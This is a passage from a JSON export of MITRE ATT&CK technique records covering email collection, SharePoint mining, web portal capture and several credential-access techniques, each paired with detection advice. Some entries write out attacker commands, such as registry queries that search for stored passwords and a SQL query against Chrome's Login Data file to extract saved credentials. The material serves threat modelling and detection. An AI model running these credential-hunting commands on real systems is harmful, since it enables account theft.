[PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":722,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":724,"name":"T1114.002 - Remote Email Collection","sort_id":0,"external_id":"T1114.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as <a href=\"https:\/\/attack.mitre.org\/software\/S0413\">MailSniper<\/a> can be used to automate searches for specific keywords.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":724,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":724,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":750,"name":"T1213.002 - Sharepoint","sort_id":0,"external_id":"T1213.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:<\/p>\n<ul>\n<li>Policies, procedures, and standards<\/li>\n<li>Physical \/ logical network diagrams<\/li>\n<li>System architecture diagrams<\/li>\n<li>Technical system documentation<\/li>\n<li>Testing \/ development credentials<\/li>\n<li>Work \/ project schedules<\/li>\n<li>Source code snippets<\/li>\n<li>Links to network shares and other internal resources<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":750,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":750,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":787,"name":"T1056.003 - Web Portal Capture","sort_id":0,"external_id":"T1056.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.<\/p>\n<p>This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1133\">External Remote Services<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":787,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":787,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":787,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":799,"name":"T1541 - Foreground Persistence","sort_id":0,"external_id":"T1541","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may abuse Android's <code>startForeground()<\/code> API method to maintain continuous sensor access. Beginning in Android 9, idle applications running in the background no longer have access to device sensors, such as the camera, microphone, and gyroscope.(Citation: Android-SensorsOverview) Applications can retain sensor access by running in the foreground, using Android\u2019s <code>startForeground()<\/code> API method. This informs the system that the user is actively interacting with the application, and it should not be killed. The only requirement to start a foreground service is showing a persistent notification to the user.(Citation: Android-ForegroundServices)<\/p>\n<p>Malicious applications may abuse the <code>startForeground()<\/code> API method to continue running in the foreground, while presenting a notification to the user pretending to be a genuine application. This would allow unhindered access to the device\u2019s sensors, assuming permission has been previously granted.(Citation: BlackHat Sutter Android Foreground 2019)<\/p>\n<p>Malicious applications may also abuse the <code>startForeground()<\/code> API to inform the Android system that the user is actively interacting with the application, thus preventing it from being killed by the low memory killer.(Citation: TrendMicro-Yellow Camera)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Users can see persistent notifications in their notification drawer and can subsequently uninstall applications that do not belong.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":799,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]}]},{"id":18,"name":"Credential Access","source_name":"ENTERPRISE_credential-access","sort_id":0,"external_id":"TA0006","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":18},"techniques":[{"id":169,"name":"T1139 - Bash History","sort_id":0,"external_id":"T1139","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Bash keeps track of the commands users type on the command-line with the &quot;history&quot; utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history<\/code> file. For each user, this file resides at the same location: <code>~\/.bash_history<\/code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":169,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":169,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":174,"name":"T1110 - Brute Force","sort_id":0,"external_id":"T1110","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":174,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":180,"name":"T1522 - Cloud Instance Metadata API","sort_id":0,"external_id":"T1522","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.<\/p>\n<p>Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)<\/p>\n<p>If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)<\/p>\n<p>The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]\/\/169.254.169.254<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":180,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":180,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":180,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":195,"name":"T1003 - OS Credential Dumping","sort_id":0,"external_id":"T1003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0008\">Lateral Movement<\/a> and access restricted information.<\/p>\n<p>Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"### Windows\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https:\/\/attack.mitre.org\/software\/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%\/system32\/config\/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https:\/\/attack.mitre.org\/software\/S0002). [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1086) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the \/proc filesystem for the process being analyzed. This file is stored under the path <code>\/proc\/<pid>\/maps<\/code>, where the <code><pid><\/code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":195,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":195,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":195,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":196,"name":"T1503 - Credentials from Web Browsers","sort_id":0,"external_id":"T1503","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) <\/p>\n<p>Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.<\/p>\n<p>For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data<\/code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;<\/code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData<\/code>, which uses the victim\u2019s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData \u200eApril 2018)<\/p>\n<p>Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)<\/p>\n<p>Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)<\/p>\n<p>After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and\/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":196,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":196,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":196,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":197,"name":"T1081 - Credentials in Files","sort_id":0,"external_id":"T1081","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code\/binary files containing embedded passwords.<\/p>\n<p>It is possible to extract passwords from backups or saved virtual machines through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">Credential Dumping<\/a>. (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)<\/p>\n<p>In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":197,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":198,"name":"T1214 - Credentials in Registry","sort_id":0,"external_id":"T1214","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.<\/p>\n<p>Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)<\/p>\n<ul>\n<li>Local Machine Hive: <code>reg query HKLM \/f password \/t REG_SZ \/s<\/code><\/li>\n<li>Current User Hive: <code>reg query HKCU \/f password \/t REG_SZ \/s<\/code><\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":198,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":241,"name":"T1212 - Exploitation for Credential Access","sort_id":0,"external_id":"T1212","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":241,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":241,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":241,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":254,"name":"T1187 - Forced Authentication","sort_id":0,"external_id":"T1187","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.<\/p>\n<p>The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.<\/p>\n<p>Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)<\/p>\n<p>Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB\/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1221\">Template Injection<\/a>), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)<\/p>\n<p>There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:<\/p>\n<ul>\n<li>A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1221\">Template Injection<\/a>). The document can include, for example, a request similar to <code>file[:]\/\/[remote address]\/Normal.dotm<\/code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)<\/li>\n<li>A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\\pic.png<\/code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\n\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":254,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":273,"name":"T1141 - Input Prompt","sort_id":0,"external_id":"T1141","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1088\">Bypass User Account Control<\/a>).<\/p>\n<p>Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be 